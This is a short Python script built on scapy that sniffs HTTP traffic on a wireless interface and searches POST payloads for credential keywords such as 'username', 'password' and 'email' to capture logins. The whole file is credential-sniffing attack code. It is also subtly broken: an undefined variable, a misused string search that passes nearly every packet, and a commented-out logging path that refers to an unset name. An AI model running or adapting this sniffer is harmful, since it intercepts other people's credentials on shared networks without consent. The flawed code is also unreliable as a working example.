#!/bin/python
import scapy.all as scapy
from scapy_http import http
from colorama import Fore,Back,Style
from datetime import datetime


def FileName():
	return  datetime.strftime(datetime.now(),'%Y-%m-%d-%H-%M-%S')


def Sniff(interface):
	scapy.sniff(iface=interface,store=False,prn=Prosess_sniffed_paceket)

def Geturl(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def Post(packet):
	http_packet = str(packet)
	if http_packet.find('POST'):
		return packet



# def RawToStr(packet):
# 	print(Fore.BLUE+ "---------------------------------- POST --------------------------------------------")
# 	print("\n".join(packet.sprintf("{Raw:%Raw.load%}\n".split(r"\r\n"))))


def Get_login_info(packet):
	if packet.haslayer(scapy.Raw):
		load = packet[scapy.Raw].load
		keywords = ["username","user","login","password","pass","email","name"]
		for keyword in keywords:
			if Keyword in load:
				return load
				

def Prosess_sniffed_paceket(packet):
	Rawdata = Post(packet)
	print(str(Rawdata).encode())
	# if packet.haslayer(http.HTTPRequest):
	# 	url = Geturl(packet)
	# 	print(Fore.BLUE + "[+] HTTP Request >>" + str(url))
	# 	loginfo = Get_login_info(packet)
	# 	if loginfo:
	# 		print(Fore.RED + "\n\n\t [!] Possible Username/password >> " + load + "\n\n\n")
	# 		file = open('log_' + FileName() + '.txt' ,'+w')

Sniff("wlp2s0")


